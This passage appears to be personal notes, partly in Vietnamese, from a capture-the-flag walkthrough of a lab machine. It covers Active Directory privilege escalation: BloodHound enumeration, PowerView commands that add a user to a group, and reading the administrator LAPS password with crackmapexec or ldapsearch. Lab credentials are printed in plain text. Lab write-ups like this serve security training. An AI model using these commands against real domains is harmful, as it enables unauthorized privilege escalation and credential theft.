![https://lh7-us.googleusercontent.com/LPs28DEoSw_ftdpUM9c996qmn4aPNst1msiIoJaaT4SnXGDt5PO0qjqLlIN0lPHjr8QxtdvPFMYAXODwL-6MBv8tk-0NWylxtbDj9sEuyGWjLPbIJrE2xRhh3Xx0LACDn9SO0HANVcLd](https://lh7-us.googleusercontent.com/LPs28DEoSw_ftdpUM9c996qmn4aPNst1msiIoJaaT4SnXGDt5PO0qjqLlIN0lPHjr8QxtdvPFMYAXODwL-6MBv8tk-0NWylxtbDj9sEuyGWjLPbIJrE2xRhh3Xx0LACDn9SO0HANVcLd)

user JDgodd login smb thành công nhưng  ko có quyền sd evil-winrm

![https://lh7-us.googleusercontent.com/vzLuz_uY1FgKrDw5U5urNhqhTlBX85ABYf2LChRlp_KOiE_MtTh9ucLrf6NfJugVL2enwmW57-o8J7LkkpwkE1iS2Hwx2ueFciBfTRLPkvGElwgLt7w8FBZcBOrT7YuJNG-CULyfkG4w](https://lh7-us.googleusercontent.com/vzLuz_uY1FgKrDw5U5urNhqhTlBX85ABYf2LChRlp_KOiE_MtTh9ucLrf6NfJugVL2enwmW57-o8J7LkkpwkE1iS2Hwx2ueFciBfTRLPkvGElwgLt7w8FBZcBOrT7YuJNG-CULyfkG4w)

sử dụng sharphound(chạy trên victim) hoặc bloodhound-python(chạy trên kali với cred của 1 acc trên ad) để nén dữ liệu trên ad vào 1 file .zip, ne04j (is a graph database), bloodhound để tham khảo hướng khai thác

![https://lh7-us.googleusercontent.com/QStaTp57A3-D2Rv6il13MdCLyUNnTC-o82H0TXZlmrtbRQohTAX6AZqxvs36qsqU2CQ9-CQ2HK0ioARZZVVa-u7201gu_stup6OheyJDAmEugknARfJUSpTfHXOOA6o2fB22-Xq-WutM](https://lh7-us.googleusercontent.com/QStaTp57A3-D2Rv6il13MdCLyUNnTC-o82H0TXZlmrtbRQohTAX6AZqxvs36qsqU2CQ9-CQ2HK0ioARZZVVa-u7201gu_stup6OheyJDAmEugknARfJUSpTfHXOOA6o2fB22-Xq-WutM)

We can see that the domain user JDgodd has WriteOwner over the group CORE STAFF and CORE STAFF have LAPS read ability on the domain controller, which will allow anyone in the CORE STAFF group to read the LAPS passwords for any user. To abuse this we need to add JDgodd to the CORE STAFF group and then request the LAPS password of the administrator. Since we do not have access to the JDgodd account we need to use PowerShell to add JDgodd into the CORE STAFF group by utilizing PowerView . Download PowerView locally.

![https://lh7-us.googleusercontent.com/KiA9u6ClTPVtN4w-yHOJEC6gSn1RIjV59N0uHpy_P6sWhU9uHnjyg_lGmf1D4HsS6gNQSZmZKGfq81GCRBI-fdhzkbHaSqe5V8ahQNz5CIRLKtD96jygkKSvaIEX93AUEvpZ8hWcMUx2](https://lh7-us.googleusercontent.com/KiA9u6ClTPVtN4w-yHOJEC6gSn1RIjV59N0uHpy_P6sWhU9uHnjyg_lGmf1D4HsS6gNQSZmZKGfq81GCRBI-fdhzkbHaSqe5V8ahQNz5CIRLKtD96jygkKSvaIEX93AUEvpZ8hWcMUx2)

PS C:\Users\nikk37\Desktop> Import-Module .\PowerView.ps1

tạo đối tượng thông tin xác thực cho user JDgodd

PS C:\Users\nikk37\Desktop> $pass = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force

PS C:\Users\nikk37\Desktop> $cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $pass)

thêm JDgodd vào group ‘Core Staff’

PS C:\Users\nikk37\Desktop> Add-DomainObjectAcl -Credential $cred -TargetIdentity "Core Staff" -PrincipalIdentity "streamio\JDgodd"

PS C:\Users\nikk37\Desktop> Add-DomainGroupMember -Credential $cred -Identity "Core Staff" -Members "StreamIO\JDgodd"

kiểm tra đã thêm thành công chưa

![https://lh7-us.googleusercontent.com/2nrcrNB6WzqW8kkrk0wDTnNwzNxsk_177BHoFOhhl7Vvr0Yp5cpZGX9p-IxGIKDkKyVDCnGY2TtABMCuj_XrQ-x3H8j8JMvUUHTSJzFrfwE674vl88hn8VSHJMsccBXaFdwauDsTbSn-](https://lh7-us.googleusercontent.com/2nrcrNB6WzqW8kkrk0wDTnNwzNxsk_177BHoFOhhl7Vvr0Yp5cpZGX9p-IxGIKDkKyVDCnGY2TtABMCuj_XrQ-x3H8j8JMvUUHTSJzFrfwE674vl88hn8VSHJMsccBXaFdwauDsTbSn-)

lấy LAPS password

dùng crackmapexec kiểm tra kết nối, ko login được nhưng lộ pw

![https://lh7-us.googleusercontent.com/_KvYScH4gwfA-uw3Fq4p58Mh69K1KM6WhxU9tCwZbyKNGWbyTbQsw0SDOoB2-QparScl-901DnEmiKRAIw6EnbwarB8pR7r1Tphbyk9w1gN5sLjQMuuy46gSN-8iFd5hjVDjP4oY7x2s](https://lh7-us.googleusercontent.com/_KvYScH4gwfA-uw3Fq4p58Mh69K1KM6WhxU9tCwZbyKNGWbyTbQsw0SDOoB2-QparScl-901DnEmiKRAIw6EnbwarB8pR7r1Tphbyk9w1gN5sLjQMuuy46gSN-8iFd5hjVDjP4oY7x2s)

administrator:n1bru.+g@owl}W

hoặc sử dụng lapsdumper [LAPSDumper/laps.py at main · n00py/LAPSDumper (github.com)](https://github.com/n00py/LAPSDumper/blob/main/laps.py)

![https://lh7-us.googleusercontent.com/TznsUmaJcAUTJQKXC04cCRl9VOGFsGe8urv0OBQxFfg_MhMZ7VrDhRc2-sDhFuHh03ulZlEv6qR5OruQ8I9HNKXDCX0m01JxjyMOwLjZIqjgkryMY7kqo5OglbIoagd5MbLOrjgUrJz4](https://lh7-us.googleusercontent.com/TznsUmaJcAUTJQKXC04cCRl9VOGFsGe8urv0OBQxFfg_MhMZ7VrDhRc2-sDhFuHh03ulZlEv6qR5OruQ8I9HNKXDCX0m01JxjyMOwLjZIqjgkryMY7kqo5OglbIoagd5MbLOrjgUrJz4)

hoặc dùng ldapsearch

ldapsearch -h 10.10.11.158 -b 'DC=streamIO,DC=htb' -x -D JDgodd@streamio.htb -w 'JDg0dd1s@d0p3cr3@t0r' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd

![https://lh7-us.googleusercontent.com/kYK2_QrH1q2OYZO58BINyxOL8n_FgjVYjqM1RJ4MwfwLCwh_9I5RkNJP8J8Ttz3wS3O_cWcLRz20mQRpX9wKWTEWSd_AQJwa8BlW3tZ19FPSA332EAgkJo_UQNHY9nB6JZB0p6vRrKCm](https://lh7-us.googleusercontent.com/kYK2_QrH1q2OYZO58BINyxOL8n_FgjVYjqM1RJ4MwfwLCwh_9I5RkNJP8J8Ttz3wS3O_cWcLRz20mQRpX9wKWTEWSd_AQJwa8BlW3tZ19FPSA332EAgkJo_UQNHY9nB6JZB0p6vRrKCm)

dùng evil-winrm leo quyền administrator

![https://lh7-us.googleusercontent.com/yfhlJluxqyQ8iD3mUxnanFFuQXGtCawJWvWya5T7BsaA_1UgNir3e7xeiVCJWzCzLjjb6rKG3u_q2lrIT6RPsHAn-RUG8FmZFoLZR2Jn97HZ7M7e3BiBIWuO_1DErhmLlPVUW0hxr1h4](https://lh7-us.googleusercontent.com/yfhlJluxqyQ8iD3mUxnanFFuQXGtCawJWvWya5T7BsaA_1UgNir3e7xeiVCJWzCzLjjb6rKG3u_q2lrIT6RPsHAn-RUG8FmZFoLZR2Jn97HZ7M7e3BiBIWuO_1DErhmLlPVUW0hxr1h4)

lấy flag root

![https://lh7-us.googleusercontent.com/we30bD3JTaT0mHwNJ-NHYNftHN_-bLYZtpOuBYkXwxn2dGL7wmGqLC-qmimtGdCuSytMVKMimWea998wTqto0eP9D4bYKXgcHJibshvq4LaQkAQ8OO2LV_S8evDD26Y1LXekm_HIWOIx](https://lh7-us.googleusercontent.com/we30bD3JTaT0mHwNJ-NHYNftHN_-bLYZtpOuBYkXwxn2dGL7wmGqLC-qmimtGdCuSytMVKMimWea998wTqto0eP9D4bYKXgcHJibshvq4LaQkAQ8OO2LV_S8evDD26Y1LXekm_HIWOIx)